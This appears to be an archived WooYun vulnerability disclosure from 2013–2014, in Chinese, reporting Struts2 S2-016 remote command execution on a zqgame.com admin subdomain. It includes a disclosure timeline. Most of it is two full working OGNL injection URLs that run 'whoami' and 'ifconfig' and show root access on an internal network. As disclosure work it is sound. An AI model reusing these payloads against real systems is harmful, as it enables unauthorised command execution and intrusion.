wybug_title: 分站命令执行杀入中青宝内网
wybug_corp: 中青宝互动网络股份有限公司
wybug_detail:
漏洞详情 披露状态：   									2013-12-08：	细节已通知厂商并且等待厂商处理中									2013-12-10：	厂商已经确认，细节仅向厂商公开									2013-12-20：	细节向核心白帽子及相关领域专家公开									2013-12-30：	细节向普通白帽子公开									2014-01-09：	细节向实习白帽子公开									2014-01-22：	细节向公众公开  简要描述： 中青宝某分站为struts2框架 杀入内网善意测试 点到为止 详细说明：  漏洞介绍页
http://struts.apache.org/release/2.3.x/docs/s2-016.html
漏洞存在地址 URL: 
http://kfadmin.zqgame.com/index.action
可以执行系统命令且当前用户为root 权限很大 又处在内网当中
http://kfadmin.zqgame.com/index.action?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27whoami%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}
whoami /* 当前用户为 root */


http://kfadmin.zqgame.com/index.action?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27ifconfig%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}
ifconfig /* 查看IP地址 为内网IP */
